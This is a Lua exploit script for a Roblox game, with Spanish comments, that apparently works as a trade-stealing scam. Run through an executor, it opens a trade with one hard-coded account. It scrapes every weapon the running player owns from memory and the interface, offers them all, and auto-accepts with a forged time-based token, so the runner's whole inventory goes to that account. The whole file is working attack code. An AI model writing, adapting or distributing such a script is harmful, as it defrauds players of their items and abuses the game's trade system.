-- Paso 1: Enviar el trade a Aaron (AARON287240) y capturar el ID de la sesión
local targetUserId = 10631566712
local targetPlayer = nil

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player.UserId == targetUserId then
        targetPlayer = player
        break
    end
end

if not targetPlayer then
    warn("Aaron no está en este servidor. ¡Entren al mismo juego!")
    return
end

-- Intentamos enviar y capturar el ID que devuelve el servidor
local successSend, currentTradeId = pcall(function()
    return game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(targetPlayer)
end)

print("¡Solicitud enviada! ID de sesión capturado:", tostring(currentTradeId))

-- Esperar a que se abra la ventana de trade
task.wait(1.5)

-- Paso 2: Extraer TODAS las armas del inventario
local weaponsList = {}
local seen = {}

pcall(function()
    for _, obj in ipairs(getgc(true)) do
        if type(obj) == "table" then
            local weapons = rawget(obj, "Weapons")
            if type(weapons) == "table" then
                local owned = rawget(weapons, "Owned")
                if type(owned) == "table" then
                    for k, val in pairs(owned) do
                        local weaponId = tonumber(k) and val or k
                        if type(weaponId) == "string" and not seen[weaponId] then
                            seen[weaponId] = true
                            table.insert(weaponsList, weaponId)
                        end
                    end
                end
            end
        end
    end
end)

pcall(function()
    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        for _, desc in ipairs(playerGui:GetDescendants()) do
            if desc:IsA("GuiObject") then
                local itemId = desc:GetAttribute("ItemID")
                if itemId and type(itemId) == "string" and not seen[itemId] then
                    seen[itemId] = true
                    table.insert(weaponsList, itemId)
                end
            end
        end
    end
end)

print("¡Se detectaron " .. #weaponsList .. " armas para ofrecer!")

-- Paso 3: Ofrecer cada arma detectada al trade
for _, weaponName in ipairs(weaponsList) do
    pcall(function()
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(weaponName, "Weapons")
    end)
    task.wait(0.12) -- Pausa corta para evitar que sature el servidor
end

task.wait(0.5)

-- Paso 4: Aceptar el trade automáticamente usando el ID y un token de tiempo fresco
local acceptArgs = {
    [1] = type(currentTradeId) == "number" and currentTradeId or 428469873,
    [2] = os.clock() * 1000 -- Genera un token decimal dinámico basado en el tiempo actual
}

local successAccept, errAccept = pcall(function()
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acceptArgs))
end)

if successAccept then
    print("¡Trade aceptado automáticamente con éxito!")
else
    warn("Error al auto-aceptar: " .. tostring(errAccept))
end
